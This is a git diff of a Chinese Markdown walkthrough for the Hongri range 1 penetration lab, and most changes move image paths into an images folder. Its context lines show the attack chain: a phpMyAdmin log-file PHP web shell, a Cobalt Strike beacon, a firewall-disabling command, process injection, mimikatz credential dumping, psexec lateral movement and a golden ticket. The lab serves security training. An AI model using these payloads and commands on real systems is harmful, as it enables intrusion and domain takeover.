@@ -48,11 +48,11 @@
 ### 靶机配置
 1. 通过扫描红日靶场 1 的本地存储目录添加虚拟机。
 2. 编辑 $\rightarrow$ 虚拟网络编辑器 $\rightarrow$ 更改配置 $\rightarrow$ 配置网络如下（只用管 VMnet2 和 VMnet8，其中 VMnet8 的NAT 模式无需保证子网地址一致，但 VMnet2 一定要保证子网地址一致）：
-![VMnet-set](VMnet-set.png)
-3. 依次编辑三台靶机设置，调整 ```网络适配器``` 为 ```自定义(VMnet2)```
-4. 编辑 win7 靶机设置，添加 ```网络适配器 2``` 为 ```NAT``` 模式
-5. 进入各靶机，密码为：```hongrisec@2019```，极大概率会让你重置密码，我们重置为 ```Admin123!```
-6. 进入各靶机，打开 ```cmd``` 或 ```powershell```，运行指令 ```ipconfig``` 查看本机 ip 地址。应如下：
+![VMnet-set](./images/VMnet-set.png)
+1. 依次编辑三台靶机设置，调整 ```网络适配器``` 为 ```自定义(VMnet2)```
+2. 编辑 win7 靶机设置，添加 ```网络适配器 2``` 为 ```NAT``` 模式
+3. 进入各靶机，密码为：```hongrisec@2019```，极大概率会让你重置密码，我们重置为 ```Admin123!```
+4. 进入各靶机，打开 ```cmd``` 或 ```powershell```，运行指令 ```ipconfig``` 查看本机 ip 地址。应如下：
 
 | 机器名称 | ip 地址（VMnet2） |
 |:-:|:-:|
@@ -71,11 +71,11 @@
 
 [蚁剑](https://github.com/AntSwordProject/)
 
-![AntSword-master](AntSword-master.png)
+![AntSword-master](./images/AntSword-master.png)
 
-![AntSword-Loader](AntSword-Loader.png)
+![AntSword-Loader](./images/AntSword-Loader.png)
 
-![AntSword-Loader-zip](AntSword-Loader-zip.png)
+![AntSword-Loader-zip](./images/AntSword-Loader-zip.png)
 
 [获取蚁剑](https://www.yuque.com/antswordproject/antsword/srruro)
 
@@ -102,7 +102,7 @@ sudo ./teamserver 192.168.114.130 kali
 
 正常情况如下：
 
-![cs-teamserver](cs-teamserver.png)
+![cs-teamserver](./images/cs-teamserver.png)
 
 在终端 2 中，运行命令，启动 Cobalt Strike 客户端
 
@@ -112,7 +112,7 @@ sudo ./teamserver 192.168.114.130 kali
 
 如下配置
 
-![cs-client](cs-client.png)
+![cs-client](./images/cs-client.png)
 
 >[!TIP]
 >
@@ -165,11 +165,11 @@ sudo ./teamserver 192.168.114.130 kali
 
 打开 win7 的 C 盘，进入 phpStudy 文件夹，双击运行 phpStudy.exe 文件
 
-![start-phpStudy](start-phpStudy.png)
+![start-phpStudy](./images/start-phpStudy.png)
 
 使用 Firefox 访问 localhost 查看网页服务是否正常启动。
 
-![localhost-check-phpStudy](localhost-check-phpStudy.png)
+![localhost-check-phpStudy](./images/localhost-check-phpStudy.png)
 
 >[!NOTE]
 >
@@ -258,7 +258,7 @@ nmap -sn 192.168.114.0/24
 >
 ></details>
 
-![nmap-for-whole-map](nmap-for-whole-map.png)
+![nmap-for-whole-map](./nmap-for-whole-map.png)
 
 </details>
 
@@ -270,13 +270,13 @@ nmap -sn 192.168.114.0/24
 nmap 192.168.114.129
 ```
 
-![nmap129](nmap129.png)
+![nmap129](./images/nmap129.png)
 
 通过扫描我们发现它开放了 $80$ 端口，运行了一个 HTTP 服务。
 
 那么，我们就可以直接用 Firefox 访问 192.168.114.129
 
-![kali-visit-win7-http](kali-visit-win7-http.png)
+![kali-visit-win7-http](./images/kali-visit-win7-http.png)
 
 >[!NOTE]
 >
@@ -330,23 +330,23 @@ nmap 192.168.114.129
 dirb http://192.168.114.129
 ```
 
-![dirb](dirb.png)
+![dirb](./images/dirb.png)
 
 我们只看这个网页下一层内容，再深的暂时不看，发现了一个 phpinfo.php 网页和两个 phpmyadmin 目录，不过显然这两个目录本质上应该没有什么区别。
 
 分别使用 Firefox 登录这两个页面。
 
-![phpinfo-1](phpinfo-1.png)
+![phpinfo-1](./images/phpinfo-1.png)
 
-![phpmyadmin-login](phpmyadmin-login.png)
+![phpmyadmin-login](./images/phpmyadmin-login.png)
 
 先说 phpinfo 界面。这个界面与 php 探针的默认界面作用类似，都是用于自查的房屋详细设计说明图。不过这个界面上的内容更丰富更具体。
 
-![phpinfo-2](phpinfo-2.png)
+![phpinfo-2](./images/phpinfo-2.png)
 
 我们向下浏览这个页面可以看到 web 服务器的具体类型是 Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 依旧可以查找其已知漏洞，不过本试验不过多展开。
 
-![phpinfo-3](phpinfo-3.png)
+![phpinfo-3](./images/phpinfo-3.png)
 
 继续往下翻，同样能看到文件根目录：```C:/phpStudy/WWW```。
 
@@ -358,7 +358,7 @@ dirb http://192.168.114.129
 
 接下来看另外一个 phpmyadmin 页面，它是一个网页管理 MySQL 数据库的工具。由于这个 web 服务环境是由 phpStudy 搭起来的，我们尝试默认 账号/密码：root/root。
 
-![phpmyadmin-localhost](phpmyadmin-localhost.png)
+![phpmyadmin-localhost](./images/phpmyadmin-localhost.png)
 
 然后就发现：诶？！试对了！进来了……
 
@@ -376,9 +376,9 @@ SHOW VARIABLES LIKE '%general%';
 -- % 通配符，表示任意字符串
 ```
 
-![phpmyadmin-SQL-showlog-1](phpmyadmin-SQL-showlog-1.png)
+![phpmyadmin-SQL-showlog-1](./images/phpmyadmin-SQL-showlog-1.png)
 
-![phpmyadmin-SQL-showlog-2](phpmyadmin-SQL-showlog-2.png)
+![phpmyadmin-SQL-showlog-2](./images/phpmyadmin-SQL-showlog-2.png)
 
 >[!NOTE]
 >
@@ -423,7 +423,7 @@ SET GLOBAL general_log="On"
 SHOW VARIABLES LIKE '%general%';
 ```
 
-![phpmyadmin-SQL-showlog3](phpmyadmin-SQL-showlog3.png)
+![phpmyadmin-SQL-showlog3](./images/phpmyadmin-SQL-showlog3.png)
 
 说明更改成功
 
@@ -439,17 +439,17 @@ SELECT '<?php @eval($_POST["888"]);?>'
 -- 语句结束标志
 ```
 
-![phpmyadmin-SQL-loginject](phpmyadmin-SQL-loginject.png)
+![phpmyadmin-SQL-loginject](./images/phpmyadmin-SQL-loginject.png)
 
 写入成功，接下来用蚁剑进行连接。
 
-![connect-externalnetworkserver-1](connect-externalnetworkserver-1.png)
+![connect-externalnetworkserver-1](./images/connect-externalnetworkserver-1.png)
 
-![connect-externalnetworkserver-2](connect-externalnetworkserver-2.png)
+![connect-externalnetworkserver-2](./images/connect-externalnetworkserver-2.png)
 
-![connect-externalnetworkserver-3](connect-externalnetworkserver-3.png)
+![connect-externalnetworkserver-3](./images/connect-externalnetworkserver-3.png)
 
-![connect-externalnetworkserver-4](connect-externalnetworkserver-4.png)
+![connect-externalnetworkserver-4](./images/connect-externalnetworkserver-4.png)
 
 >[!NOTE]
 >
@@ -526,7 +526,7 @@ SELECT '<?php @eval($_POST["888"]);?>'
 sudo ./teamserver 192.168.114.130 kali
 ```
 
-![cs-teamserver](cs-teamserver.png)
+![cs-teamserver](./images/cs-teamserver.png)
 
 在 kali 上启动 Cobalt Strike 客户端：
 
@@ -534,29 +534,29 @@ sudo ./teamserver 192.168.114.130 kali
 ./cobaltstrike
 ```
 
-![cs-client](cs-client.png)
+![cs-client](./images/cs-client.png)
 
 如图添加监听器：
 
-![add-listener](add-listener.png)
+![add-listener](./images/add-listener.png)
 
 如图创建后门程序：
 
-![create-hongrisec-1](create-hongrisec-1.png)
+![create-hongrisec-1](./images/create-hongrisec-1.png)
 
-![create-hongrisec-2](create-hongrisec-2.png)
+![create-hongrisec-2](./images/create-hongrisec-2.png)
 
 我将生成的文件保存为 ```~/Documents/hongrisec.exe```
 
 利用蚁剑进行上传
 
-![upload-hongrisec](upload-hongrisec.png)
+![upload-hongrisec](./images/upload-hongrisec.png)
 
-![upload-hongrisec-success](upload-hongrisec-success.png)
+![upload-hongrisec-success](./images/upload-hongrisec-success.png)
 
 在蚁剑空白处右键打开终端运行 ```hongrisec.exe```，并等待 CS 上线
 
-![run-hongrisec](run-hongrisec.png)
+![run-hongrisec](./images/run-hongrisec.png)
 
 当我们看见 CS 界面中出现会话，说明上线成功。
 
@@ -587,7 +587,7 @@ sudo ./teamserver 192.168.114.130 kali
 shell netsh advfirewall set allprofiles state off
 ```
 
-![close-firewall](close-firewall.png)
+![close-firewall](./images/close-firewall.png)
 
 调整回连时间间隔为 1s (默认 1min)
 
@@ -599,7 +599,7 @@ shell netsh advfirewall set allprofiles state off
 sleep 1
 ```
 
-![change-sleeptime](change-sleeptime.png)
+![change-sleeptime](./images/change-sleeptime.png)
 
 ##### 迁移进程
 
@@ -611,7 +611,7 @@ sleep 1
 ps
 ```
 
-![check-process](check-process.png)
+![check-process](./images/check-process.png)
 
 这里我们选择将进程迁移到 ```explorer.exe``` 进程中，```explorer.exe``` 是高信誉进程，安全软件不会轻易拦截
 
@@ -619,11 +619,11 @@ ps
 inject 2964
 ```
 
-![try-inject-explorer](try-inject-explorer.png)
+![try-inject-explorer](./images/try-inject-explorer.png)
 
 选择 hongri 监听器，发现不允许
 
-![inject-explorer-fail](inject-explorer-fail.png)
+![inject-explorer-fail](./images/)
 
 那我们就选择注入到 phpStudy.exe 进程中，同样选择 hongri 监听器
 
@@ -631,11 +631,11 @@ inject 2964
 inject 1528
 ```
 
-![try-inject-phpStudy](try-inject-phpStudy.png)
+![try-inject-phpStudy](./images/try-inject-phpStudy.png)
 
 发现会话多了一行，说明注入成功。
 
-![inject-phpStudy-success](inject-phpStudy-success.png)
+![inject-phpStudy-success](./images/inject-phpStudy-success.png)
 
 我们将原来的进程 kill 掉
 
@@ -643,7 +643,7 @@ inject 1528
 kill 1640
 ```
 
-![kill-hongrisec](kill-hongrisec.png)
+![kill-hongrisec](./images/kill-hongrisec.png)
 
 切换到新进程，同样将回连时间调整为 1s
 
@@ -655,17 +655,17 @@ kill 1640
 sleep 1
 ```
 
-![change-sleeptime-again](change-sleeptime-again.png)
+![change-sleeptime-again](./images/change-sleeptime-again.png)
 
 #### 提升权限
 
 如图提权，选择 hongri 监听器，并使用默认的 svc-exe
 
-![elevate-access](elevate-access.png)
+![elevate-access](./images/elevate-access.png)
 
 看到会话又多了一个 user 为 SYSTEM* 的会话，说明提权成功。
 
-![elevate-access-finish](elevate-access-finish.png)
+![elevate-access-finish](./images/elevate-access-finish.png)
 
 同理，切换到高权限进程，并将回连时间调整为 1s
 
@@ -677,7 +677,7 @@ sleep 1
 sleep 1
 ```
 
-![change-sleeptime-againandagain](change-sleeptime-againandagain.png)
+![change-sleeptime-againandagain](./images/change-sleeptime-againandagain.png)
 
 >[!IMPORTANT]
 >
@@ -693,7 +693,7 @@ sleep 1
 shell ipconfig
 ```
 
-![ipconfig](ipconfig.png)
+![ipconfig](./images/ipconfig.png)
 
 发现 win7 上有两个网卡，运行命令查看其他主机名
 
@@ -701,19 +701,19 @@ shell ipconfig
 net view
 ```
 
-![net-view](net-view.png)
+![net-view](./images/net-view.png)
 
 由此图，我们可知：OWA 是主域控制器（PDC）是整个域环境的核心资产，存储着全部域用户的账户信息与密码哈希。攻陷此目标等同于完全控制 GOD 域。
 
 我们先进行端口扫描
 
-![cs-portscan](cs-portscan.png)
+![cs-portscan](./images/cs-portscan.png)
 
 >[!TIP]
 >
 >这一过程相当缓慢，请耐心等待 ```Scanner module is complete``` 字样出现
 
-![find-445](find-445.png)
+![find-445](./images/find-445.png)
 
 发现都打开了 445 端口
 
@@ -740,11 +740,11 @@ net view
 
 如图添加一个 smb 监听器
 
-![create-smb](create-smb.png)
+![create-smb](./images/create-smb.png)
 
 如图抓取明文密码
 
-![mimikatz-password](mimikatz-password.png)
+![mimikatz-password](./images/mimikatz-password.png)
 
 通过翻找输出，我们可以知道密码是：```Admin123!```，域名是 ```GOD.ORG```
 
@@ -754,11 +754,11 @@ net view
 
 如图进行横向迁移
 
-![psexec](psexec.png)
+![psexec](./images/psexec.png)
 
 回到会话列表，等待一会儿发现多了一个 OWA 的会话，说明上线成功。
 
-![jump-PDC](jump-PDC.png)
+![jump-PDC](./images/jump-PDC.png)
 
 >[!NOTE]
 >
@@ -822,7 +822,7 @@ net view
 
 切换到 OWA 会话抓取哈希
 
-![get-hash](get-hash.png)
+![get-hash](./images/get-hash.png)
 
 输入命令查看本机 SID （安全标识符）
 
@@ -830,7 +830,7 @@ net view
 shell whoami /all
 ```
 
-![get-SID](get-SID.png)
+![get-SID](./images/get-SID.png)
 
 >[!NOTE]
 >
@@ -853,13 +853,13 @@ shell whoami /all
 
 根据已知信息，制作黄金票据
 
-![create-goldenticket-1](create-goldenticket-1.png)
+![create-goldenticket-1](./images/create-goldenticket-1.png)
 
-![create-goldenticket-2](create-goldenticket-2.png)
+![create-goldenticket-2](./images/create-goldenticket-2.png)
 
 看到输出 ```Golden ticket for 'Administrator @ GOD.ORG' successfully submitted for current session``` 说明成功生成黄金票据
 
-![create-goldenticket-success](create-goldenticket-success.png)
+![create-goldenticket-success](./images/create-goldenticket-success.png)
 
 ## 完成实验
 
@@ -867,7 +867,7 @@ shell whoami /all
 
 以图形式展示会话如下：
 
-![finish-experiment](finish-experiment.png)
+![finish-experiment](./images/finish-experiment.png)
 
 ## 实验清理
 
